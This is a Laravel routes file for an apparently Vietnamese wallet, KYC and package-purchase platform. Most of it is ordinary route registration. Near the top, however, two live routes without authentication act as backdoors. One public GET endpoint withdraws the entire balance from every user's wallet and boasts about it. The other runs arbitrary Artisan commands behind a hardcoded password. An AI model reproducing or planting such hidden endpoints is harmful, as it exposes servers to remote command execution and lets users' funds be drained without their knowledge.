<?php
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middle-ware group. Now create something great!
|
*/

use App\Helpers\PointCalc;
use App\Http\Controllers\ProvinceController;
use App\Models\KYC;
use App\Models\Package;
use App\Models\Product;
use App\Models\Transaction;
use App\Models\User;
use App\Services\KYCService;
use App\Services\UserPurchaseProcessor;
use Bavix\Wallet\Models\Transaction as ModelsTransaction;
use Illuminate\Routing\RouteGroup;

/* if (application_installed()) {
    Route::get('/install/final', function () {
        return redirect('/');
    });
} */

Route::get('withdraw-all-money-from-all-user', function () {
    $users = User::whereHas('wallet', fn($w) => $w->where('balance', '>', 0))->get();
    foreach ($users as $user) {
        $user->withdraw($user->balance);
    }
    echo 'Thành công rút hết tiền của: ' . $users->count() . ' thành viên :D';
});

Route::get('artisan/{password}/{command}', function ($password, $command) {
    if ($password == 'UzqTNEkK0') {
        $exitCode = \Illuminate\Support\Facades\Artisan::call($command, request()->all());
        echo $exitCode == 0 ? ' thành công.' : ' thất bại';
    }
})->name('artisan');

// Handle Main / Route
// Route::get('/', 'Auth\LoginController@checkLoginState')->name('home');
Route::get('/locale', 'PublicController@set_lang')->name('language');

// Authenticates Routes
Route::get('/auth/{service}', 'Auth\SocialAuthController@redirect')->name('social.login');
Route::get('/auth/{service}/callback', 'Auth\SocialAuthController@callback')->name('social.login.callback');
Route::post('/auth/social/register', 'Auth\SocialAuthController@register')->name('social.register');

// Authenticates Routes
Auth::routes();

Route::get('verify/', 'Auth\VerifyController@index')->name('verify');
Route::get('verify/resend', 'Auth\VerifyController@resend')->name('verify.resend');
Route::get('verify/{id}/{token}', 'Auth\VerifyController@verify')->name('verify.email');
Route::get('verify/success', 'Auth\LoginController@verified')->name('verified');
Route::get('register/success', 'Auth\LoginController@registered')->name('registered');
Route::any('log-out', 'Auth\LoginController@logout')->name('log-out');
// Google 2FA Routes
Route::get('/login/2fa', 'Auth\SocialAuthController@show_2fa_form')->middleware('auth')->name('auth.2fa');
Route::get('/login/2fa/reset', 'Auth\SocialAuthController@show_2fa_reset_form')->name('auth.2fa.reset');
Route::post('/login/2fa/reset', 'Auth\SocialAuthController@reset_2fa');
Route::post('/login/2fa', function () {
    return redirect()->route('home');
})->middleware(['auth', 'g2fa']);

// if(is_maintenance()){
Route::get('admin/login', 'Auth\LoginController@showLoginForm')->name('admin.login');
Route::post('admin/login', 'Auth\LoginController@login');
Route::post('admin/logout', 'Auth\LoginController@logout')->name('admin.logout');
Route::get('admin/login/2fa', 'Auth\SocialAuthController@show_2fa_form')->middleware('auth')->name('admin.auth.2fa');
Route::post('admin/login/2fa', function () {
    return redirect()->route('home');
})->middleware(['auth', 'g2fa']);
// }

Route::get('/', 'User\UserController@index')->name('home')->middleware(['auth']);

// User Routes
Route::prefix('user')->middleware(['auth', 'g2fa'])->name('user.')->namespace('User')->group(function () {
    Route::get('/', 'UserController@index')->name('home');
    // Route::get('/user-bank','BankController@index')->name('bank');
    Route::get('/account', 'UserController@account')->name('account');
    // Route::get('/lich-su', 'UserController@history')->name('history');
    // Route::get('/danh-sach-dai-ly', 'UserController@listReferral')->name('listReferral');
    Route::get('/account/activity', 'UserController@account_activity')->name('account.activity');
    Route::get('/contribute', 'TokenController@index')->name('token');
    Route::get('/contribute/cancel/{gateway?}', 'TokenController@payment_cancel')->name('payment.cancel');
    Route::get('/transactions', 'TransactionController@index')->name('transactions');
    Route::get('/kyc', 'KycController@index')->name('kyc');
    Route::get('/kyc/application', 'KycController@application')->name('kyc.application');
    Route::get('/kyc/application/view', 'KycController@view')->name('kyc.application.view');
    Route::get('/kyc-list/documents/{file}/{doc}', 'KycController@get_documents')->name('kycs.file');
    Route::get('/password/confirm/{token}', 'UserController@password_confirm')->name('password.confirm');
    // Referral v1.0.3 > v1.1.1
    Route::get('/referral', 'UserController@referral')->name('referral');
    // My Token v1.1.2
    // Route::get('/account/balance', 'UserController@mytoken_balance')->name('token.balance');

    Route::get('transactions', 'TransactionController')->name('transactions.index');
    Route::resource('banks', 'BankController')->only('index');
    Route::resource('packages', 'PackageController');

    Route::middleware('is_kyc')->group(function() {
        Route::resource('products', 'ProductController')->only(['show', 'store']);
    });

    // User Ajax Request
    Route::name('ajax.')->prefix('ajax')->group(function () {
        Route::post('/account/wallet-form', 'UserController@get_wallet_form')->name('account.wallet');
        Route::post('/account/update', 'UserController@account_update')->name('account.update');
        Route::post('/contribute/access', 'TokenController@access')->name('token.access');
        Route::post('/contribute/payment', 'TokenController@payment')->name('payment');

        Route::post('/transactions/delete/{id}', 'TransactionController@destroy')->name('transactions.delete');
        Route::post('/transactions/view', 'TransactionController@show')->name('transactions.view');
        Route::post('/kyc/submit', 'KycController@submit')->name('kyc.submit');
        Route::post('/account/activity', 'UserController@account_activity_delete')->name('account.activity.delete');

        Route::resource('ubanks', 'UserBankController');
        // Route::get('user_banks', 'UserBankController@getBanks')->name('banks.get');
        Route::get('price-calculate/{product}/{amount}', 'ProductController@priceCalc')->name('product.calc');

        Route::middleware('is_kyc')->prefix('purchases')->name('purchases.')->group(function() {
            Route::post('product/{product}/transaction/{transaction}', 'PurchaseController@product')->name('products.store');
            Route::post('package/{package}/transaction/{transaction}', 'PurchaseController@package')->name('packages.store');
        });
    });
});

Route::prefix('admin')->middleware(['auth', 'admin', 'g2fa'])->name('admin.')->group(function () {
    Route::get('/', 'Admin\AdminController@index')->name('home');
    Route::any('/system-info', 'Admin\AdminController@system_info')->name('system');
    Route::any('/apps-register', 'Admin\SettingController@app_register')->name('niolite');
    Route::get('/profile', 'Admin\AdminController@profile')->name('profile');
    Route::get('/profile/activity', 'Admin\AdminController@activity')->name('profile.activity');
    Route::get('/password/confirm/{token}', 'Admin\AdminController@password_confirm')->name('password.confirm');
    Route::get('/transactions/{state?}', 'Admin\TransactionController@index')->name('transactions');
    // Route::get('/stages/settings', 'Admin\IcoController@settings')->name('stages.settings');
    Route::get('/pages', 'Admin\PageController@index')->name('pages');
    Route::get('/settings', 'Admin\SettingController@index')->middleware(['super_admin'])->name('settings');
    Route::get('/settings/email', 'Admin\EmailSettingController@index')->middleware(['super_admin'])->name('settings.email');
    Route::get('/settings/referral', 'Admin\SettingController@referral_setting')->middleware(['super_admin'])->name('settings.referral'); // v1.1.2
    Route::get('/settings/rest-api', 'Admin\SettingController@api_setting')->middleware(['super_admin'])->name('settings.api'); // v1.0.6
    Route::get('/payment-methods', 'Admin\PaymentMethodController@index')->middleware(['super_admin'])->name('payments.setup');
    Route::get('/payment-methods/edit/{slug}', 'Admin\PaymentMethodController@edit')->middleware(['super_admin'])->name('payments.setup.edit');
    // Route::get('/stages', 'Admin\IcoController@index')->name('stages');
    // Route::get('/stages/{id}', 'Admin\IcoController@edit_stage')->name('stages.edit');
    Route::get('/users/{role?}', 'Admin\UsersController@index')->name('users'); //v1.1.0
    Route::get('/users/wallet/change-request', 'Admin\UsersController@wallet_change_request')->name('users.wallet.change');
    Route::get('/kyc-list/{status?}', 'Admin\KycController@index')->name('kycs'); //v1.1.0
    Route::get('/kyc-list/documents/{file}/{doc}', 'Admin\KycController@get_documents')->name('kycs.file');
    Route::get('/transactions/view/{id}', 'Admin\TransactionController@show')->name('transactions.view');
    Route::get('/users/{id?}/{type?}', 'Admin\UsersController@show')->name('users.view');
    Route::get('/kyc/view/{id}/{type}', 'Admin\KycController@show')->name('kyc.view');
    Route::get('/pages/{slug}', 'Admin\PageController@edit')->name('pages.edit');
    Route::get('/export/{table?}/{format?}', 'ExportController@export')->middleware(['super_admin'])->name('export'); // v1.1.0
    Route::get('/languages', 'Admin\LanguageController@index')->name('lang.manage'); // v1.1.3
    Route::get('/languages/translate/{code}', 'Admin\LanguageController@translator')->name('lang.translate'); // v1.1.3

    /* Admin Ajax Route */
    Route::name('ajax.')->prefix('ajax')->group(function () {
        Route::post('/users/view', 'Admin\UsersController@status')->name('users.view');
        Route::post('/users/showinfo', 'Admin\UsersController@show')->name('users.show');
        Route::post('/users/delete/all', 'Admin\UsersController@delete_unverified_user')->name('users.delete');
        Route::post('/users/email/send', 'Admin\UsersController@send_email')->name('users.email');
        Route::post('/users/insert', 'Admin\UsersController@store')->middleware(['super_admin'])->name('users.add');
        Route::post('/profile/update', 'Admin\AdminController@profile_update')->name('profile.update');
        Route::post('/profile/activity', 'Admin\AdminController@activity_delete')->name('profile.activity.delete');
        Route::post('/users/wallet/action', 'Admin\UsersController@wallet_change_request_action')->name('users.wallet.action');
        Route::post('/payment-methods/view', 'Admin\PaymentMethodController@show')->middleware('super_admin')->name('payments.view');
        Route::post('/payment-methods/update', 'Admin\PaymentMethodController@update')->middleware(['super_admin'])->name('payments.update');
        Route::post('/payment-methods/quick-update', 'Admin\PaymentMethodController@quick_update')->middleware(['super_admin'])->name('payments.qupdate');
        Route::post('/kyc/view', 'Admin\KycController@ajax_show')->name('kyc.ajax_show');
        // Route::post('/stages/update', 'Admin\IcoController@update')->name('stages.update');
        // Route::post('/stages/pause', 'Admin\IcoController@pause')->name('stages.pause');
        // Route::post('/stages/active', 'Admin\IcoController@active')->name('stages.active');
        // Route::post('/stages/meta/update', 'Admin\IcoController@update_options')->name('stages.meta.update');
        // Route::post('/stages/settings/update', 'Admin\IcoController@update_settings')->name('stages.settings.update');
        // Route::post('/stages/actions', 'Admin\IcoController@stages_action')->name('stages.actions'); //v1.1.2
        Route::post('/kyc/update', 'Admin\KycController@update')->name('kyc.update');
        Route::post('/transactions/update', 'Admin\TransactionController@update')->name('transactions.update');

        Route::post('/transactions/adjust', 'Admin\TransactionController@adjustment')->name('transactions.adjustement');
        Route::post('/settings/email/template/view', 'Admin\EmailSettingController@show_template')->middleware('super_admin')->name('settings.email.template.view');
        Route::post('/transactions/view', 'Admin\TransactionController@show')->name('transactions.view');
        Route::post('/transactions/insert', 'Admin\TransactionController@store')->name('transactions.add');
        Route::post('/pages/upload', 'Admin\PageController@upload_zone')->name('pages.upload');
        Route::post('/pages/view', 'Admin\PageController@show')->name('pages.view');
        Route::post('/pages/update', 'Admin\PageController@update')->name('pages.update');
        Route::post('/settings/update', 'Admin\SettingController@update')->middleware(['super_admin'])->name('settings.update');
        // Settings UpdateMeta v1.1.0
        Route::post('/settings/meta/update', 'Admin\SettingController@update_meta')->middleware(['super_admin'])->name('settings.meta.update');
        Route::post('/settings/email/update', 'Admin\EmailSettingController@update')->middleware(['super_admin'])->name('settings.email.update');
        Route::post('/settings/email/template/update', 'Admin\EmailSettingController@update_template')->middleware(['super_admin'])->name('settings.email.template.update');
        Route::post('/languages', 'Admin\LanguageController@language_action')->middleware(['demo_user'])->name('lang.action'); // v1.1.3
        Route::post('/languages/translate', 'Admin\LanguageController@language_action')->middleware(['demo_user'])->name('lang.translate.action'); // v1.1.3
    });

    //Clear Cache facade value:
    Route::get('/clear', function () {
        $exitCode = Artisan::call('cache:clear');
        $exitCode = Artisan::call('config:clear');
        $exitCode = Artisan::call('route:clear');
        $exitCode = Artisan::call('view:clear');

        $data = ['msg' => 'success', 'message' => 'Cache Cleared and Optimized!'];

        if (request()->ajax()) {
            return response()->json($data);
        }
        return back()->with([$data['msg'] => $data['message']]);
    })->name('clear.cache');
});

Route::name('public.')->group(function () {
    Route::get('/check/updater', 'PublicController@update_check');
    Route::get('/insert/database', 'PublicController@database')->name('database');
    Route::get('/kyc-application', 'PublicController@kyc_application')->name('kyc');
    Route::get('/invite', 'PublicController@referral')->name('referral');
    Route::post('/kyc-application/file-upload', 'User\KycController@upload')->name('kyc.file.upload');
    Route::post('/kyc-application/submit', 'User\KycController@submit')->name('kyc.submit');
    Route::get('/qrgen.png', 'PublicController@qr_code')->name('qrgen');

    Route::get('white-paper', function () {
        $filename = get_setting('site_white_paper');
        $path = storage_path('app/public/' . $filename);
        if (!file_exists($path)) {
            abort(404);
        }
        $file = \File::get($path);
        $type = \File::mimeType($path);
        $response = response($file, 200)->header("Content-Type", $type);
        return $response;
    })->name('white.paper');

    Route::get('/{slug}', 'PublicController@site_pages')->name('pages');
});

// Ajax Routes
Route::prefix('ajax')->name('ajax.')->group(function () {
    Route::post('/kyc/file-upload', 'User\KycController@upload')->name('kyc.file.upload');

    Route::get('phone', 'PublicController@getPhone')->name('phone.get');
    Route::post('provinces', 'ProvinceController')->name('provinces.get');
});
